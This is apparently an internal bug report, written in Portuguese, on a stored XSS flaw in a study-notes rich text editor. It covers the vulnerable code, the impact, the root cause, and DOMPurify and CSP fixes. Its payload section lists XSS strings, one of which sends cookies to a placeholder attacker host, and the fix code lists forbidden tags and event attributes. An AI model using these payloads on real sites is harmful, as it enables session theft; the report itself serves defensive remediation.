# BUG-001: Stored XSS no RichTextEditor (Módulo de Estudos)

## Informações Gerais

| Campo | Valor |
|-------|-------|
| **ID** | BUG-001 |
| **Título** | Stored XSS no RichTextEditor via HTML não sanitizado |
| **Gravidade** | **ALTA** |
| **Recurso Afetado** | Dashboard > Estudos > Anotações |
| **Arquivo** | `src/components/estudos/RichTextEditor.tsx` |
| **Data de Identificação** | 2026-01-16 |

---

## Descrição

O componente `RichTextEditor` utilizado no módulo de Estudos permite a inserção e armazenamento de HTML arbitrário sem sanitização adequada. O conteúdo é salvo diretamente no banco de dados via `editor.getHTML()` e posteriormente renderizado sem tratamento, permitindo a execução de scripts maliciosos.

---

## Ação Realizada

### Cenário de Teste
1. Acessar Dashboard > Estudos
2. Criar ou editar uma anotação
3. No editor de texto rico, inserir payload XSS via:
   - Inspecionar elemento e modificar o HTML interno
   - Colar conteúdo HTML malicioso

### Payload Utilizado
```html
<img src=x onerror="alert('XSS')">
```

```html
<svg onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

```html
<a href="javascript:alert(document.domain)">Clique aqui</a>
```

### Código Vulnerável
```typescript
// src/components/estudos/RichTextEditor.tsx:57-59
onUpdate: ({ editor }) => {
  onChange(editor.getHTML()); // HTML não sanitizado é enviado para a API
},
```

### API Afetada
```typescript
// src/app/api/v1/estudos/anotacoes/route.ts:87-95
const anotacao = await prisma.anotacao.create({
  data: {
    titulo,
    conteudo: conteudo || '', // Conteúdo HTML armazenado sem sanitização
    cor: cor || '#FBBF24',
    cursoId,
    userId: user.id,
  },
});
```

---

## Impacto

| Tipo de Impacto | Descrição |
|-----------------|-----------|
| **Roubo de Sessão** | Atacante pode roubar cookies de sessão (`document.cookie`) |
| **Keylogging** | Injeção de scripts que capturam inputs do usuário |
| **Phishing** | Redirecionamento para páginas falsas |
| **Defacement** | Modificação visual do dashboard |
| **Propagação** | Se anotações forem compartilháveis, o XSS se propaga |

---

## Causa Raiz

1. **Falta de sanitização no frontend**: O TipTap editor permite HTML arbitrário sem whitelist de tags permitidas
2. **Falta de sanitização no backend**: A API `/api/v1/estudos/anotacoes` armazena o conteúdo sem limpar tags perigosas
3. **Renderização insegura**: O conteúdo é renderizado com `dangerouslySetInnerHTML` ou equivalente sem escape

---

## Ação Corretiva

### 1. Sanitização no Backend (Recomendado)
Instalar e usar `dompurify` ou `sanitize-html`:

```bash
npm install isomorphic-dompurify
```

```typescript
// src/app/api/v1/estudos/anotacoes/route.ts
import DOMPurify from 'isomorphic-dompurify';

// Configurar tags permitidas
const ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'u', 's', 'h1', 'h2', 'h3',
                      'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'img', 'a'];
const ALLOWED_ATTR = ['href', 'src', 'alt', 'class', 'style'];

// Antes de salvar
const sanitizedContent = DOMPurify.sanitize(conteudo, {
  ALLOWED_TAGS,
  ALLOWED_ATTR,
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form'],
});

const anotacao = await prisma.anotacao.create({
  data: {
    titulo,
    conteudo: sanitizedContent,
    // ...
  },
});
```

### 2. Configurar TipTap com Extensões Seguras
```typescript
// RichTextEditor.tsx - Adicionar sanitização na saída
import DOMPurify from 'dompurify';

onUpdate: ({ editor }) => {
  const html = editor.getHTML();
  const sanitized = DOMPurify.sanitize(html, {
    FORBID_TAGS: ['script', 'iframe'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick']
  });
  onChange(sanitized);
},
```

### 3. Content Security Policy (CSP)
Adicionar header CSP no `next.config.js`:

```javascript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: "script-src 'self'; object-src 'none';"
  }
];
```

---

## Referências

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

---

## Status

| Status | Data |
|--------|------|
| Identificado | 2026-01-16 |
| Reportado | 2026-01-16 |
| Corrigido | 2026-01-17 |
| Verificado | 2026-01-17 |

### Correção Implementada
- DOMPurify configurado no `RichTextEditor.tsx` com whitelist de tags permitidas
- Sanitização no backend em `api/v1/estudos/anotacoes/route.ts` antes de salvar
- Tags perigosas (`script`, `iframe`, `object`, `embed`, `form`) bloqueadas
- Atributos de eventos (`onerror`, `onload`, `onclick`, etc.) removidos
